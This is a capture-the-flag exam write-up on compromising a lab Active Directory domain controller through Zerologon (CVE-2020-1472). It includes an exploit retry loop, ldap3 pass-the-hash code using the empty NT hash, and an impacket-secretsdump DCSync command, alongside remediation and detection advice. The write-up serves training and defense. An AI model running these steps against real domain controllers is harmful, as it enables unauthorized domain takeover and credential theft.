# Task 3 — Windows / Active Directory Domain Compromise

**CyberEd Portal — HackCamp 2026 Penetration Testing Exam**

| Field | Details |
|---|---|
| **Task** | 3 — Windows |
| **Category** | Active Directory Exploitation |
| **Vulnerability Class** | CVE-2020-1472 (Zerologon) — Netlogon Cryptographic Implementation Flaw |
| **Difficulty** | Medium |
| **Target** | `<TARGET_IP>` |
| **Domain** | `sandbox.local` |
| **Domain Controller** | `DC1.sandbox.local` |
| **Group** | 362 |
| **Status** | Solved ✅ |

---

## Executive Summary

The target environment hosted an Active Directory **Domain Controller** (`DC1.sandbox.local`) vulnerable to **CVE-2020-1472 (Zerologon)**, a critical flaw in the cryptographic implementation of the Netlogon Remote Protocol (MS-NRPC). Exploitation allowed the Domain Controller's own machine account (`DC1$`) to have its password reset to an empty value, without any prior credentials.

The resulting authentication material was used to bind to **LDAP via NTLM** as `DC1$` and query directory attributes directly — avoiding a noisier DCSync operation. A targeted search of the `description` attribute across domain objects revealed the exam flag on a service account (`JONAS_CARTER`).

A significant portion of the engagement involved adapting the exploit and tooling to a **highly unreliable, high-packet-loss VPN connection**, which required protocol-level and application-level tuning to achieve a stable exploitation path.

**Impact:** Full compromise of the Domain Controller's machine account credentials, enabling authenticated LDAP access and, if required, a complete domain credential dump via DCSync.

---

## Attack Chain

```
Domain Controller Recon
          │
          ▼
Zerologon (CVE-2020-1472)
          │
          ▼
   DC1$ machine account
          │
          ▼
 Empty machine-account password
          │
          ▼
     NTLM authentication
          │
          ▼
        LDAP query
          │
          ▼
 User "description" attribute
          │
          ▼
          🚩 FLAG
```

---

## 1. Reconnaissance

A full-port scan was used to enumerate exposed services on the target:

```bash
nmap -Pn -p- --min-rate 3000 <TARGET_IP>
```

**Services identified:**

| Port | Service |
|---|---|
| 53 | DNS |
| 88 | Kerberos |
| 135 | RPC |
| 139 | NetBIOS |
| 389 | LDAP |
| 445 | SMB |
| 636 | LDAPS |
| 3268 | Global Catalog |
| 5985 | WinRM |
| 9389 | Active Directory Web Services |

This combination of ports is a strong, well-known fingerprint of an **Active Directory Domain Controller**, immediately narrowing the attack surface toward AD-specific attack vectors.

---

## 2. LDAP Enumeration

An anonymous LDAP root query was issued to identify the domain and hostname without requiring credentials:

```bash
ldapsearch -x \
  -H ldap://<TARGET_IP> \
  -s base \
  -b "" \
  namingContexts defaultNamingContext dnsHostName
```

**Response:**

```
defaultNamingContext: DC=sandbox,DC=local
dnsHostName: DC1.sandbox.local
```

**Confirmed:**

- Domain: `sandbox.local`
- Domain Controller: `DC1.sandbox.local`

Anonymous reads of directory *objects* (beyond the RootDSE) were blocked, confirming the environment required authentication for further LDAP enumeration.

---

## 3. Additional Enumeration Attempts

Several standard AD enumeration techniques were attempted and evaluated:

| Technique | Outcome |
|---|---|
| SAMR/RID cycling | Restricted by target configuration |
| Guest / anonymous SMB access | Disabled |
| Kerberos user enumeration (`kerbrute`) | Possible, but heavily rate-limited; required `-t 1` (single-threaded) to avoid lockout/throttling |

Given the reliability constraints of the environment, user enumeration was deprioritized once **Zerologon** was confirmed as the intended and most direct attack path — pursuing it further would have cost time without changing the outcome.

---

## 4. Initial Access — Zerologon (CVE-2020-1472)

### 4.1 Vulnerability Overview

**CVE-2020-1472 ("Zerologon")** is a critical vulnerability (CVSS 10.0) in the cryptographic implementation of the Netlogon Remote Protocol. It stems from improper use of AES-CFB8 encryption with a static, all-zero initialization vector during the Netlogon authentication handshake. This allows an attacker to spoof the identity of any computer account — including the Domain Controller's own machine account — and reset its password to an empty value, all without prior authentication.

### 4.2 Exploit Setup

The public exploit implementation used was:

```
dirkjanm/CVE-2020-1472
```

It was configured against the Domain Controller's NetBIOS name and the target IP:

```
DC1
<TARGET_IP>
```

---

## 5. Overcoming VPN Reliability Issues

The exam VPN exhibited severe, sustained packet loss, which directly threatened the exploit's reliability. Two adjustments were made to compensate.

### 5.1 Bypassing the RPC Endpoint Mapper

The stock exploit relies on the RPC Endpoint Mapper (port 135) to negotiate the Netlogon RPC binding, which proved unreliable under packet loss. The exploit was modified to bind directly to the **Netlogon named pipe over SMB (port 445)**, avoiding the extra endpoint-mapper round trip entirely:

```
ncacn_np:<TARGET_IP>[\pipe\netlogon]
```

Connection timeouts were also extended to tolerate retransmission delays.

### 5.2 Retry Loop for Transient Failures

Even with the more direct binding, individual attempts could still fail due to packet loss. A retry loop was used to let TCP retransmissions succeed across repeated attempts:

```bash
IP=<TARGET_IP>

for i in $(seq 1 40); do
    echo "try $i"
    timeout 320 python3 ~/Downloads/cve-2020-1472-exploit.py DC1 $IP && break
done
```

**Successful run output:**

```
Target vulnerable, changing account password to empty string
Result: 0
Exploit complete!
```

The Domain Controller's machine account password was successfully reset to empty.

---

## 6. Resulting Credential Material

Following the successful exploit, the machine account authenticated with the well-known **empty NT hash**:

```
31d6cfe0d16ae931b73c59d7e0c089c0
```

| Attribute | Value |
|---|---|
| Account | `DC1$` |
| NT Hash | `31d6cfe0d16ae931b73c59d7e0c089c0` (empty password) |

This credential pair was sufficient for pass-the-hash style NTLM authentication as the Domain Controller's own machine account.

---

## 7. Post-Exploitation — Targeted LDAP Query

Rather than performing a full **DCSync** (which is noisier and pulls the entire domain credential database), the compromised `DC1$` account was used to bind directly to LDAP via NTLM and query specific attributes — a lower-footprint approach well suited to the objective of locating a single flag.

```python
from ldap3 import Server, Connection, NTLM, SUBTREE, NONE

server = Server(
    ip,
    get_info=NONE,
    connect_timeout=90
)

conn = Connection(
    server,
    user=r'SANDBOX\DC1$',
    password='aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
    authentication=NTLM,
    auto_bind=True,
    receive_timeout=90
)

conn.search(
    'DC=sandbox,DC=local',
    '(description=*)',
    SUBTREE,
    attributes=[
        'sAMAccountName',
        'description',
        'info',
        'comment'
    ]
)
```

### 7.1 Key Optimization: `get_info=NONE`

By default, `ldap3` fetches the full Active Directory schema (`get_info=ALL`) when establishing a connection, which is a large amount of data. Over the lossy VPN this consistently caused timeouts before the query itself could even run. Setting `get_info=NONE` skipped schema retrieval entirely, reducing the connection to only what was needed: authentication and the targeted search — a small but critical adjustment that made the exploit viable under the network conditions.

---

## 8. Flag Location

The LDAP search returned a match on a service account with the flag embedded in its `description` attribute:

```
CN=JONAS_CARTER,
OU=ServiceAccounts,
OU=GOO,
OU=Tier 2,
DC=sandbox,
DC=local
```

**Description field:**

```
cybered{YOUR_FLAG_HERE}
```

**Flag location:** `JONAS_CARTER.description`

---

## 9. Alternative Approach (Not Required)

Had direct description-reading access been restricted, the same `DC1$` credential could instead have been used to perform a **DCSync** attack and extract the Administrator NT hash directly:

```bash
impacket-secretsdump \
  -just-dc-user administrator \
  -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' \
  'sandbox.local/DC1$@<TARGET_IP>'
```

The recovered Administrator hash could then be used for the same LDAP query (or any other domain action). This path was not needed, as the targeted LDAP search succeeded directly.

---

## 10. Root Cause Analysis

| Weakness | Description |
|---|---|
| **Unpatched Netlogon implementation** | The Domain Controller had not applied the August 2020 security update addressing CVE-2020-1472, leaving the flawed AES-CFB8/zero-IV handshake exploitable. |
| **No secure Netlogon enforcement** | `FullSecureChannelProtection` was not enforced, allowing unauthenticated password resets via the vulnerable handshake. |
| **Machine account credential reuse** | Once compromised, the `DC1$` account had sufficient directory read privileges to expose sensitive data stored in LDAP attributes. |

---

## 11. Impact

- **Unauthenticated compromise of the Domain Controller's machine account**, requiring no prior credentials or user interaction.
- Machine account credentials can be leveraged for **DCSync**, extracting **every credential hash in the domain**, including the Domain Administrator.
- Full **domain compromise** is achievable from this single vulnerability in an unpatched environment.

**Severity:** Critical.

---

## 12. Remediation Recommendations

| Recommendation | Description |
|---|---|
| **Patch immediately** | Apply Microsoft's August 2020 security update and enforce `FullSecureChannelProtection` per Microsoft's Zerologon guidance. |
| **Enforce secure Netlogon** | Set the `RequireSignOrSeal` / secure channel enforcement registry keys once all devices in the environment are patched and compatible. |
| **Monitor Netlogon events** | Alert on Event IDs 5827/5828 (denied vulnerable Netlogon connections) as an indicator of exploitation attempts. |
| **Least-privilege LDAP attributes** | Avoid storing secrets or flags/sensitive notes in generally-readable attributes such as `description`, `info`, or `comment`. |
| **Credential rotation** | Rotate the Domain Controller's machine account password (`Reset-ComputerMachinePassword`) after any suspected exploitation. |

---

## 13. Lessons Learned

**Active Directory Reconnaissance**
- A cluster of exposed ports (53/88/389/445/3268/9389/5985) is a reliable AD Domain Controller fingerprint.
- An anonymous LDAP RootDSE query is a low-noise, credential-free way to confirm the domain name and DC hostname.
- Kerberos, LDAP, SMB, and RPC should be assessed together, since AD attack paths frequently cross between them.

**Zerologon**
- CVE-2020-1472 remains a devastating, unauthenticated path to full domain compromise on unpatched Domain Controllers.
- Network reliability directly affects RPC-based exploits — having a fallback binding string (SMB named pipe vs. endpoint mapper) can be the difference between success and failure.

**LDAP Post-Exploitation**
- A compromised machine account alone can expose meaningful directory data without needing a full DCSync.
- LDAP attributes like `description`, `info`, and `comment` are common (and risky) places for administrators to leave notes — including, sometimes, secrets.
- Minimizing query and connection overhead matters significantly on unreliable networks.

**Troubleshooting Under Adverse Network Conditions**
- Increase timeouts proportionally to observed packet loss.
- Build retry loops around any exploit step that depends on unreliable network completion.
- Trim unnecessary operations (like full schema downloads) that add fragile round trips without contributing to the objective.

---

## 14. References

- **CVE-2020-1472** — Zerologon (Netlogon Elevation of Privilege)
- **dirkjanm/CVE-2020-1472** — Public proof-of-concept exploit
- **MS-NRPC** — Netlogon Remote Protocol specification

---

## 15. Final Attack Path

```
AD Domain Controller
        │
        ▼
Reconnaissance
        │
        ▼
Identify sandbox.local / DC1
        │
        ▼
CVE-2020-1472 (Zerologon)
        │
        ▼
Compromise DC1$ machine account
        │
        ▼
Empty machine-account password
        │
        ▼
NTLM authentication
        │
        ▼
LDAP search
        │
        ▼
JONAS_CARTER.description
        │
        ▼
🚩 FLAG CAPTURED
```

---

## Conclusion

This engagement combined systematic Active Directory reconnaissance with exploitation of **Zerologon (CVE-2020-1472)** to compromise the Domain Controller's own machine account, followed by a low-footprint, targeted LDAP query to recover the flag — deliberately avoiding a full DCSync where it wasn't necessary. The most valuable practical lesson was adapting the exploitation methodology to a severely degraded network: switching RPC bindings, extending timeouts, retrying transient failures, and trimming unnecessary LDAP overhead were each individually small changes that, together, were what made exploitation reliably achievable.
